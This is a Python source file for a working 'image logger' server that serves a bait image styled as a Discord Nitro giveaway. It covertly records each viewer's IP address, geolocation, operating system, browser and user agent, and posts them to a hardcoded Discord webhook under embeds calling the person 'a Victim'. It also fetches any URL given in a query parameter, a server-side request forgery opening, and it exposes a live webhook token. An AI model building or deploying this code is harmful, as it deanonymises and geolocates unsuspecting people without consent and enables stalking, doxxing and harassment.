from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import httpx
import base64
import httpagentparser
import logging

# --- Configuration ---
# Your new webhook URL
webhook = 'https://discord.com/api/webhooks/1472149557772288112/1xNaSzehD8JYGNjKGiwUi5VgZbctKwmKEl1N2M2qqwxd_8hB1d8tFpXrgysElW2S0fZJ'
# Your new image URL
image_url = 'https://cdn.prod.website-files.com/5f9072399b2640f14d6a2bf4/654580c0a25af460db3ebc23_DIS%20MKT%20NITRO%20DROP%20Blog%20Header.jpg'
# Fallback image data, fetched at startup
try:
    bindata = httpx.get(image_url).content
except httpx.RequestError as e:
    logging.error(f"Could not fetch initial image from {image_url}: {e}")
    bindata = b'' # Use empty data as a fallback

# Optional: A bugged image for Discord previews
buggedimg = False
# A placeholder for a bugged image if needed
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

# --- Discord Embed Payloads ---
def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "Fentanyl",
        "content": "@everyone",
        "embeds": [{
            "title": "Fentanyl strikes again!",
            "color": 16711803,
            "description": "A Victim opened the original Image. You can find their info below.",
            "author": {"name": "Fentanyl"},
            "fields": [
                {
                    "name": "IP Info",
                    "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
                    "inline": True
                },
                {
                    "name": "Advanced Info",
                    "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
                    "inline": False
                }
            ]
        }]
    }

def prev(ip, uag):
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [{
            "title": "Fentanyl Alert!",
            "color": 16711803,
            "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
            "author": {"name": "Fentanyl"},
            "fields": []
        }]
    }

# --- HTTP Request Handler ---
class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Determine which image to serve
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        try:
            # Allow dynamic image serving via ?url=... parameter
            data = httpx.get(dic['url']).content if 'url' in dic else bindata
        except Exception:
            data = bindata # Fallback to default image on error

        # Get user agent and parse it
        useragent = self.headers.get('user-agent', 'No User Agent Found!')
        os, browser = httpagentparser.simple_detect(useragent)

        # Get the real IP, assuming a reverse proxy setup
        ip = self.headers.get('x-forwarded-for', self.client_address[0])

        # Check if the request is from Discord's preview crawlers
        is_discord_crawler = 'discord' in useragent.lower()
        is_known_discord_ip = ip.startswith(('35.', '34.', '104.196.'))

        if is_known_discord_ip and is_discord_crawler:
            # This is a preview, send the alert and serve the image
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(buggedbin if buggedimg else bindata)
            # Send the preview notification asynchronously (non-blocking in this simple case)
            try:
                httpx.post(webhook, json=prev(ip, useragent))
            except httpx.RequestError as e:
                logging.error(f"Failed to send preview webhook: {e}")
        else:
            # This is a real user click
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(data)
            
            # Gather detailed IP info and send the full report
            try:
                ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json').json()
                httpx.post(webhook, json=formatHook(
                    ipInfo.get('ip', ip),
                    ipInfo.get('city', 'N/A'),
                    ipInfo.get('region', 'N/A'),
                    ipInfo.get('country', 'N/A'),
                    ipInfo.get('loc', 'N/A'),
                    ipInfo.get('org', 'N/A'),
                    ipInfo.get('postal', 'N/A'),
                    useragent, os, browser
                ))
            except httpx.RequestError as e:
                logging.error(f"Failed to get IP info or send full webhook: {e}")
            except Exception as e:
                logging.error(f"An unexpected error occurred during webhook processing: {e}")
        
        # Suppress the default logging message for each request
        return

    def log_message(self, format, *args):
        return

if __name__ == '__main__':
    httpd = HTTPServer(('0.0.0.0', 8080), handler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
